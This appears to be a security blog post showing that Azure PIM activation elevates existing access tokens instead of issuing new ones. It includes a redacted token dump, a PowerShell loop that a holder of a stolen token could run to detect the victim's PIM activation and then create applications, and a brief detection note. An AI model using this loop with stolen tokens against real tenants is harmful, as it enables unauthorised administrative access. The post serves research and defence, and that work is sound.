---
layout: post
title: Are you sure you know Azure PIM?
date: '2024-01-26 12:12:09'
---

Azure PIM is good, but there is always **_but_**

Everything in Azure based on tokens, when you authenticate with you modern CBA method you will get again token back which will give you access to resources. What is important - administrative access have option to "escalate" tokens for some time to do **real job** and your access expire. But is it really expire? Or just wait until you will _escalate_ again?

It is require ID P2/Governance license .. 

And not working as moste people think .. It DOES NOT create new token, it is juste escalate ALL tokens which is connected to elevated account!

Really good blog from Cody Burkard describe main points:
https://codyburkard.com/blog/jitprivilegeescalation/

But lets test! =)

Get token!

![Access Token and refresh . . jepp refresh always come with it](../images/03/bilde1.png){: .mx-auto.d-block :}

Token info (redacted):

>{
  "aud": "https://management.core.windows.net/",
  "iss": "https://sts.windows.net/",
  "iat": 1706522835,
  "nbf": 1706522835,
  "exp": 1706527683,
  "acr": "1",
  "aio": "A",
  "amr": [
    "pwd",
    "mfa"
  ],
  "appid": "1",
  "appidacr": "0",
  "family_name": "Borodai",
  "given_name": "Artem",
  "groups": [
    "e"
  ],
  "idtyp": "user",
  "ipaddr": "1",
  "name": "Artem Borodai",
  "oid": "c",
  "puid": "1",
  "rh": "0.A",
  **"scp": "user_impersonation",**
  "sub": "6",
  "tid": "4",
  "unique_name": "artem.borodai@blinq",
  "upn": "artem.borodai@blinq",
  "uti": "P",
  "ver": "1.0",
  "wids": [
    "b"
  ],
  "xms_cae": "1",
  "xms_cc": [
    "CP1"
  ],
  "xms_filter_index": [
    "129"
  ],
  "xms_rd": "0.4",
  "xms_ssm": "1",
  "xms_tcdt": 1614601636
>}

Lets play with access =)

![Access denied, try PIM, I am waiting](../images/03/bilde3.png){: .mx-auto.d-block :}

Nope, 403, which is right user not PIMed . . 

And if we steal token, how we will find out if user is pimed??? Just run script =)

>while (1 -eq 1 ){
>$command=try{New-AzADApplication -DisplayName blinQ *>&1}catch{$_}  $command | Out-File c:\CIS\iwanttoknow.txt -Append
start-sleep -seconds 10
}

Then user PIMed . . 

And jepp - token escalated without any additional moves . . 

>Az.MSGraph.internal\New-AzADApplication : Insufficient privileges to complete the operation.
>At C:\Program Files\WindowsPowerShell\Modules\Az.Resources\6.11.1\MSGraph.Autorest\custom\New-AzADApplication.ps1:698 char:5
>+     $app = Az.MSGraph.internal\New-AzADApplication @PSBoundParameters
>+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : InvalidOperation: ({ body = {
  "...reADMyOrg"
} }:<>f__AnonymousType12`1) [New-AzADApplication_CreateExpanded], Exception
    + FullyQualifiedErrorId : Authorization_RequestDenied,Microsoft.Azure.PowerShell.Cmdlets.Resources.MSGraph.Cmdlets.NewAzADApplication_CreateExpanded
Az.MSGraph.internal\New-AzADApplication : Insufficient privileges to complete the operation.
At C:\Program Files\WindowsPowerShell\Modules\Az.Resources\6.11.1\MSGraph.Autorest\custom\New-AzADApplication.ps1:698 char:5
>+     $app = Az.MSGraph.internal\New-AzADApplication @PSBoundParameters
>+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
>    + CategoryInfo          : InvalidOperation: ({ body = {
  "...reADMyOrg"
>} }:<>f__AnonymousType12`1) [New-AzADApplication_CreateExpanded], Exception
    + FullyQualifiedErrorId : Authorization_RequestDenied,Microsoft.Azure.PowerShell.Cmdlets.Resources.MSGraph.Cmdlets.NewAzADApplication_CreateExpanded
>
>DisplayName Id                                   AppId                               
>----------- --                                   -----                               
>blinQ   694f2d2f-e5x
>
>
>
>DisplayName Id                                   AppId                               
>----------- --                                   -----                               
>blinQ   a0b7f9c7-e3x

Detection:

Only unusual IP, and of course Admin access should be limited to PAW IP (which I never saw in my life . . )

![Ups I did it again](../images/03/bilde4.png){: .mx-auto.d-block :}

P.S: If it was interesting for you - read carefully Cody blog up there . . 